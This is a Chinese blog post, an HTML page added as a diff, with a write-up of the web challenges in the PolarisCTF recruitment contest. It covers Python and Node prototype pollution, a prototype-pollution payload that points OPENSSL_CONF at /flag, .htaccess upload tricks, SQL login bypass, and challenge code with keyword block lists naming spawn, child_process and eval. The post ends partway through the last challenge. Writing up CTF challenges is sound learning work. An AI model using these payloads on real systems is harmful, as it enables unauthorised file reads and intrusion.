@@ -1,0 +1,920 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PolarisCTF 招新赛 Web 部分：ez_python、SSTI、JWT 等题解。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PolarisCTF 招新赛 Web 部分">
+<meta property="og:url" content="https://xendr1a.github.io/2026/03/05/polarisctf-2025/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="PolarisCTF 招新赛 Web 部分：ez_python、SSTI、JWT 等题解。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-01.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-02.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-03.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-04.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-05.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-06.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-07.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-08.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-09.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-10.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-11.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-12.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-13.png">
+<meta property="article:published_time" content="2026-03-05T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:34.974Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="PolarisCTF">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xendr1a.github.io/img/polarisctf-2025/img-01.png">
+  
+  
+  
+  <title>PolarisCTF 招新赛 Web 部分 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">PolarisCTF 招新赛 Web 部分</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-05 10:00" pubdate>
+          2026年3月5日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PolarisCTF 招新赛 Web 部分</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>本文同时发表于博客园：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xendria/p/19824429/polarisctf-recruitment-competition-web-part-1spljh">原文</a></p>
+</blockquote>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs text">#源码<br>from flask import Flask, request<br>import json<br><br>app = Flask(__name__)<br><br>def merge(src, dst):<br>    for k, v in src.items():<br>        if hasattr(dst, &#x27;__getitem__&#x27;):<br>            if dst.get(k) and type(v) == dict:<br>                merge(v, dst.get(k))<br>            else:<br>                dst[k] = v<br>        elif hasattr(dst, k) and type(v) == dict:<br>            merge(v, getattr(dst, k))<br>        else:<br>            setattr(dst, k, v)<br><br>class Config:<br>    def __init__(self):<br>        self.filename = &quot;app.py&quot;<br><br>class Polaris:<br>    def __init__(self):<br>        self.config = Config()<br><br>instance = Polaris()<br><br>@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])<br>def index():<br>    if request.data:<br>        merge(json.loads(request.data), instance)<br>    return &quot;Welcome to Polaris CTF&quot;<br><br>@app.route(&#x27;/read&#x27;)<br>def read():<br>    return open(instance.config.filename).read()<br><br>@app.route(&#x27;/src&#x27;)<br>def src():<br>    return open(__file__).read()<br><br>if __name__ == &#x27;__main__&#x27;:<br>    app.run(host=&#x27;0.0.0.0&#x27;, port=5000, debug=False)<br></code></pre></td></tr></table></figure>
+
+<p>&#x2F;会把用户提交的 json 合并到全局对象instance 上，&#x2F;read会读取instance.config.filename，我们post一段json覆盖就行了，然后访问&#x2F;read</p>
+<p><img src="/img/polarisctf-2025/img-01.png" alt="5db6e199-fd02-4323-884b-eac903fbcd38-20260328200720-t9bs66z"></p>
+<h2 id="only-real"><a href="#only-real" class="headerlink" title="only real"></a>only real</h2><p>挺迷惑的，前端有个登入，然后里面又有个上传入口和jwt伪造，结果扫一下目录出来了，像是非预期</p>
+<p><img src="/img/polarisctf-2025/img-02.png" alt="4cb74ab1-ea8b-48fe-b903-92e233a5012f-20260328201556-8z7lbl8"></p>
+<p>访问flag.php</p>
+<h2 id="only-real-revenge"><a href="#only-real-revenge" class="headerlink" title="only_real_revenge"></a>only_real_revenge</h2><p>登入，想着先测测文件上传毕竟有个upload.php，进去发现直接就是上传成功，找半天没找到上传点那就自己搓一个了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /upload.php HTTP/1.1<br>Host: 80-97220b16-73b3-4cf2-a93a-6845cbdb62a0.challenge.ctfplus.cn<br>Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3OTMzMzV9.fr8lMtAJqwUdClW4e1inh8fSRjfT2Jx86rvCQjAAYPI<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryA<br>Content-Length: 168<br><br>------WebKitFormBoundaryA<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;<br>Content-Type: text/plain<br><br>111111111111111111111<br>------WebKitFormBoundaryA--<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/polarisctf-2025/img-03.png" alt="cb9ddb80-5632-47f3-8a46-7f702fab56bb-20260329212341-fr0ccc5"></p>
+<p>传进去了，php被禁了，可以打.htaccess</p>
+<p><img src="/img/polarisctf-2025/img-04.png" alt="c7ddf46a-fada-49f3-8cb3-26f8b4cd287f-20260329213004-ymnnxf3"></p>
+<h2 id="ezpollute"><a href="#ezpollute" class="headerlink" title="ezpollute"></a>ezpollute</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs text">//源码<br>const express = require(&#x27;express&#x27;);<br>const &#123; spawn &#125; = require(&#x27;child_process&#x27;);<br>const path = require(&#x27;path&#x27;);<br><br>const app = express();<br>app.use(express.json());<br>app.use(express.static(__dirname));<br><br>function merge(target, source, res) &#123;<br>    for (let key in source) &#123;<br>        if (key === &#x27;__proto__&#x27;) &#123;<br>            if (res) &#123;<br>                res.send(&#x27;get out!&#x27;);<br>                return;<br>            &#125;<br>            continue;<br>        &#125; <br>        <br>        if (source[key] instanceof Object &amp;&amp; key in target) &#123;<br>            merge(target[key], source[key], res);<br>        &#125; else &#123;<br>            target[key] = source[key];<br>        &#125;<br>    &#125;<br>&#125;<br><br>let config = &#123;<br>    name: &quot;CTF-Guest&quot;,<br>    theme: &quot;default&quot;<br>&#125;;<br><br>app.post(&#x27;/api/config&#x27;, (req, res) =&gt; &#123;<br>    let userConfig = req.body;<br><br>    const forbidden = [&#x27;shell&#x27;, &#x27;env&#x27;, &#x27;exports&#x27;, &#x27;main&#x27;, &#x27;module&#x27;, &#x27;request&#x27;, &#x27;init&#x27;, &#x27;handle&#x27;,&#x27;environ&#x27;,&#x27;argv0&#x27;,&#x27;cmdline&#x27;];<br>    const bodyStr = JSON.stringify(userConfig).toLowerCase();<br>    for (let word of forbidden) &#123;<br>        if (bodyStr.includes(`&quot;$&#123;word&#125;&quot;`)) &#123;<br>            return res.status(403).json(&#123; error: `Forbidden keyword detected: $&#123;word&#125;` &#125;);<br>        &#125;<br>    &#125;<br><br>    try &#123;<br>        merge(config, userConfig, res);<br>        res.json(&#123; status: &quot;success&quot;, msg: &quot;Configuration updated successfully.&quot; &#125;);<br>    &#125; catch (e) &#123;<br>        res.status(500).json(&#123; status: &quot;error&quot;, message: &quot;Internal Server Error&quot; &#125;);<br>    &#125;<br>&#125;);<br><br>app.get(&#x27;/api/status&#x27;, (req, res) =&gt; &#123;<br><br>    const customEnv = Object.create(null);<br>    for (let key in process.env) &#123;<br>        if (key === &#x27;NODE_OPTIONS&#x27;) &#123;<br>            const value = process.env[key] || &quot;&quot;;<br><br>            const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;<br><br>            if (!dangerousPattern.test(value)) &#123;<br>                customEnv[key] = value;<br>            &#125;<br>            continue;<br>        &#125;<br>        customEnv[key] = process.env[key];<br>    &#125;<br>    <br>    const proc = spawn(&#x27;node&#x27;, [&#x27;-e&#x27;, &#x27;console.log(&quot;System Check: Node.js is running.&quot;)&#x27;], &#123;<br>        env: customEnv,<br>        shell: false <br>    &#125;);<br>    <br>    let output = &#x27;&#x27;;<br>    proc.stdout.on(&#x27;data&#x27;, (data) =&gt; &#123; output += data; &#125;);<br>    proc.stderr.on(&#x27;data&#x27;, (data) =&gt; &#123; output += data; &#125;);<br>    <br>    proc.on(&#x27;close&#x27;, (code) =&gt; &#123;<br>        res.json(&#123; <br>            status: &quot;checked&quot;, <br>            info: output.trim() || &quot;No output from system check.&quot;<br>        &#125;);<br>    &#125;);<br>&#125;);<br><br>app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;<br>    res.sendFile(path.join(__dirname, &#x27;index.html&#x27;));<br>&#125;);<br><br>// Flag 位于 /flag<br>app.listen(3000, &#x27;0.0.0.0&#x27;, () =&gt; &#123;<br>    console.log(&#x27;Server running on port 3000&#x27;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>原型链污染，禁掉了<code>&#39;__proto__&#39;</code>，可以用<code>constructor.prototype</code>，</p>
+<p>题目对 <code>NODE_OPTIONS</code> 做了过滤，禁了这些<code>const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;</code></p>
+<p><code>NODE_OPTIONS</code>是node.js的环境变量，然后看到这里</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">const proc = spawn(&#x27;node&#x27;, [&#x27;-e&#x27;, &#x27;console.log(&quot;System Check: Node.js is running.&quot;)&#x27;], &#123;<br>        env: customEnv,<br>        shell: false <br>    &#125;);<br></code></pre></td></tr></table></figure>
+
+<p>我们能控制子进程的环境变量，</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">    let output = &#x27;&#x27;;<br>    proc.stdout.on(&#x27;data&#x27;, (data) =&gt; &#123; output += data; &#125;);<br>    proc.stderr.on(&#x27;data&#x27;, (data) =&gt; &#123; output += data; &#125;);<br>    <br>    proc.on(&#x27;close&#x27;, (code) =&gt; &#123;<br>        res.json(&#123; <br>            status: &quot;checked&quot;, <br>            info: output.trim() || &quot;No output from system check.&quot;<br>        &#125;);<br>    &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>输出在这里<code>output.trim()</code>，stderr会被返回</p>
+<p>那哪些环境变量会在 node 启动时自动生效呢，node.js关于文件读写的就这个<code>NODE_OPTIONS</code>但是被禁了我们得想想别的，Node.js 启动时，会加载V8、Libuv 和 OpenSSL这三个，V8和Libuv几乎没有什么环境变量，直接去找OpenSSL，</p>
+<p>找到了</p>
+<p><img src="/img/polarisctf-2025/img-05.png" alt="34b7525d-2afb-48db-b70f-80af7e093551-20260331225524-b513ij2"></p>
+<p>跟进一下</p>
+<p><img src="/img/polarisctf-2025/img-06.png" alt="c351f49b-1f70-481b-ad99-13efe9476d1f-20260331230009-zya0ket"></p>
+<p>当 Node.js 启动并加载 OpenSSL 时，OpenSSL 会立即寻找这个配置文件，以确定加密算法的行为、证书的路径以及安全策略。<strong>OPENSSL_CONF</strong>会告诉 OpenSSL 库去哪里读取它的配置文件，直接用</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;OPENSSL_CONF&quot;:&quot;/flag&quot;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/polarisctf-2025/img-07.png" alt="f1074d69-62ea-458a-9c97-e47fe22415e6-20260329213606-4z7qqn8"></p>
+<h2 id="Broken-Trust"><a href="#Broken-Trust" class="headerlink" title="Broken Trust"></a>Broken Trust</h2><p>注册个账户，登入发现</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">async function refreshProfile() &#123;<br>    const uid = &quot;94a4925f690b4b0883a90b57e7471b12&quot;; // 现在是字符串<br>    const msg = document.getElementById(&#x27;msg&#x27;);<br>    msg.innerText = &quot;Syncing with API...&quot;;<br>    <br>    try &#123;<br>        const response = await fetch(&#x27;/api/profile&#x27;, &#123;<br>            method: &#x27;POST&#x27;,<br>            headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;,<br>            body: JSON.stringify(&#123; uid: uid &#125;) // 发送字符串<br>        &#125;);<br>        const data = await response.json();<br>        if(data.username) &#123;<br>            msg.innerText = &quot;Session synced. Current user: &quot; + data.username;<br>        &#125; else &#123;<br>            msg.innerText = &quot;Sync failed: &quot; + (data.error || &quot;Unknown error&quot;);<br>        &#125;<br>    &#125; catch (e) &#123;<br>        msg.innerText = &quot;Error connecting to API.&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>去测一下</p>
+<p><img src="/img/polarisctf-2025/img-08.png" alt="b7606233-b749-4447-ac08-a6aaf96d6653-20260329232044-1mpc18n"></p>
+<p>看回显猜是sql了，试了一下万能密码直接绕了，给了admin的uid</p>
+<p><img src="/img/polarisctf-2025/img-09.png" alt="37b199da-0e23-4cb7-9609-9ffb1b2e0dff-20260329232231-49ejhny"></p>
+<p>后面文件读取，可以双写绕过</p>
+<p><img src="/img/polarisctf-2025/img-10.png" alt="c2b9745d-37c3-4b7e-a678-f81c89264771-20260329232552-bbby4s3"></p>
+<h2 id="醉里挑灯看剑"><a href="#醉里挑灯看剑" class="headerlink" title="醉里挑灯看剑"></a>醉里挑灯看剑</h2><p>没学过ts，但是点进去又感觉看的明白，</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs text">import &#123; SQL &#125; from &#x27;bun&#x27;;<br>import crypto from &#x27;node:crypto&#x27;;<br>import fs from &#x27;node:fs&#x27;;<br>import path from &#x27;node:path&#x27;;<br>import &#123; createServer, IncomingMessage, ServerResponse &#125; from &#x27;node:http&#x27;;<br><br>const PORT = Number(process.env.PORT || &#x27;80&#x27;);<br>const JSON_LIMIT = 28 * 1024;<br>const EXPR_LIMIT = 1800;<br>const RELEASE_CHALLENGE_TTL_MS = 3 * 60 * 1000;<br><br>const DB_DSN = &#x27;sqlite:///app/data/service.db&#x27;;<br>const SECRET_DIR = &#x27;/app/secrets&#x27;;<br>const GUEST_KEY_PATH = path.join(SECRET_DIR, &#x27;guest.key.json&#x27;);<br>const MAINTAINER_KEY_PATH = path.join(SECRET_DIR, &#x27;release-maintainer.key.json&#x27;);<br>const RUNNER_KEY = process.env.RUNNER_KEY || &#x27;dev-runner-key&#x27;;<br>const FLAG_VALUE = process.env.FLAG_VALUE || &#x27;flag&#123;dev_placeholder_flag&#125;&#x27;;<br><br>const db = new SQL(DB_DSN);<br><br>const BLOCKED_EXPRESSION_TOKENS = [<br>  &#x27;process&#x27;,<br>  &#x27;globalthis&#x27;,<br>  &#x27;constructor&#x27;,<br>  &#x27;function&#x27;,<br>  &#x27;require&#x27;,<br>  &#x27;import&#x27;,<br>  &#x27;fetch&#x27;,<br>  &#x27;bun&#x27;,<br>  &#x27;http&#x27;,<br>  &#x27;spawn&#x27;,<br>  &#x27;eval&#x27;,<br>  &#x27;node:&#x27;,<br>  &#x27;child_process&#x27;,<br>  &#x27;websocket&#x27;<br>] as const;<br><br>type SessionRole = &#x27;guest&#x27; | &#x27;maintainer&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>开头注意到flag，交一下发现不对，有个sql，最下面这行应该是用户‘guest’ 和 ‘maintainer’，</p>
+<p>FLAG_VALUE最后一次出现是在这里&#x2F;api&#x2F;release&#x2F;claim</p>
